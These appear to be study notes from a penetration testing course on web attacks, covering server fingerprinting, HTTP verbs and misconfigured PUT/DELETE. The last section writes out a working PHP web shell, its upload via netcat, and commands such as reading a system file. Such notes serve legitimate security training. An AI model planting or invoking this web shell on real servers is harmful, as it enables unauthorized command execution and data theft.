Penetration Testing 4 - Web Application Attacks

Web Server Fingerprinting
	Detecting: 
		Daemon providing the service (E.g. IIS, Apache, nginx)
		Version
		OS of the host
	
	Netcat (TCP/IP Swiss army knife)
		Can act as client or server
		Banner Grabbing (Non-SSL)
			nc <Target Address> 80
			HEAD / HTTP/1.0
			
		Notes: 
			Request in Uppercase
			Connects silently. Just need to write command (-v for verbose)
		
			openssl s_client -connect target.site:443
			HEAD / HTTP/1.0
			
			
	HTTPrint
		httprint -P0 -h <target hosts> -s <signatue file>
			-P0 = Don't ping
			-h = list of hosts
			-s = signature file to use
			
		E.g.
			httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt
			
HTTP VERBS
	GET
		Request a resource
			GET /page.php HTTP/1.1
			Host: www.example.site
			
			GET /page.php?course=PTS HTTP/1.1
			Host: www.exaple.site			
	POST
		Submit HTML form POST Parameters in message body
			POST /login.php HTTP/1.1
			Host: www.example.site
			
			username=john&password=mypass

	HEAD
		Similar to GET and is asks for just the headders of the response. 
			HEAD / HTTP/1.1
			Host: www.example.site
			
	PUT
		Upload a file to a server. Dangerous if misconfigured. 
			PUT /path/to/destination HTTP/1.1
			Host: www.example.site
			
			<PUT data>
			
	DELETE
		Delete a file from a server
			DELETE /path/to/destination HTTP/1.1
			Host: www.example.site
		
	OPTIONS
		Query the server for enabled HTTP Verbs (If using HTTP/1.0 can skip the Host)
			OPTIONS / HTTP/1.1
			Host: www.example.site


Exploiting Misconfigured Verbs
	Becomnig uncommon
		Common in embedded devices, IP Cameras, and smart devices. 
		
	Send OPTIONS message
		nc victim.site 80
		OPTIONS / HTTP/1.0
		
	Exploiting DELETE
		nc victim.site 80
		DELETE /path/to/resource.txt HTTP/1.0
		
	Exploiting PUT
		Need size of the file
			wc -m payload.php
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 20
		<?php phpinfo(); ?>
		
		Uploading a PHP Shell with PUT
		
		wc -m shell.php
			136 shell.php
		
		nc victim.site 80
		PUT /payload.php HTTP/1.0
		Content-type: text/html
		Content-length: 136
		<?php
		if (isset($_GET['cmd']))
		{
			$cmd = $_GET['cmd'];
			echo '<pre>';
			$result = shell_exec($cmd);
			echo $result;
			echo '</pre>';
		}
		?>
		
		Called by browsing like the below to execute the ls command: 
			victim.site/shell.php?cmd=ls
		Or
			victim.site/shell.php?cmd=cat /etc/passed
